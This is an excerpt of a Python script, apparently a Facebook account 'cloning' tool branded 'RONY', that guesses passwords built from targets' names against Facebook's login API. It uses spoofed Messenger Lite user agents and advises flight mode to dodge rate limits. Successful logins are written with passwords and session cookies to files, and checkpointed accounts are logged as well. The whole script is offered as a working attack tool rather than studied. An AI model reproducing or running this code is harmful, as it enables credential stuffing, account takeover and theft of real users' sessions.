...
def logo():
	logo = ('''\033[1;97m                                    
\033[1;95m 8888888b.   .d88888b.  888b    888 Y88b   d88P 
\033[1;95m 888   Y88b d88P" "Y88b 8888b   888  Y88b d88P  
\033[1;37m 888    888 888     888 88888b  888   Y88o88P   
\033[1;37m 888   d88P 888     888 888Y88b 888    Y888P    
\033[1;90m 8888888P"  888     888 888 Y88b888     888     
\033[1;90m 888 T88b   888     888 888  Y88888     888     
\033[1;92m 888  T88b  Y88b. .d88P 888   Y8888     888     
\033[1;92m 888   T88b  "Y88888P"  888    Y888     888     
                                               
                               UNBEATABLE RONY 😈 
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            RONY ROOH ULLAH  😘
\033[1;37m Facebook:            ROOH ULLAH
\033[1;37m Github  :            NAHI HAI
\033[1;37m Version :            0.0
---------------------------------------------------''')
	p(logo)


ua3 = "Davik/2.1.0 (Linux; U; Android 11; V2043_21 Build/RP1A.200720.012) [FBAN/MessengerLite;FBAV/311.0.0.1.142;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/738442042;FBCR/ZONG;FBMF/vivo;FBBD/vivo;FBDV/V2043_21;FBSV/11;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"



ua2 = ' Davik/2.1.0 (Linux; U; Android 11; V2043_21 Build/RP1A.200720.012) [FBAN/MessengerLite;FBAV/311.0.0.1.142;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/738442042;FBCR/ZONG;FBMF/vivo;FBBD/vivo;FBDV/V2043_21;FBSV/11;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]'

# USER AGENT FUNCTION UA 1 METHOD 1
def iAmAndroidUa():
	# YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "Davik/2.1.0 (Linux; U; Android 11; V2043_21 Build/RP1A.200720.012) [FBAN/MessengerLite;FBAV/325.0.0.2.144;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/119874936;FBCR/ZONG;FBMF/vivo;FBBD/vivo;FBDV/V2043_21;FBSV/11;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"
...
class Main:
	...
	def saved_results(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			...
			p(' [❤️] Total OK Accounts : %s '%(len(ok)))
	...
	def password_menu(self,id):
		...
		line()
		p(' [•] Use Flight Mode Before / During Cloning ')
		line()
	...
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [RONY😘] %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[RONY-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/RONY_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/RONY_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[RONY-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/RONY_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
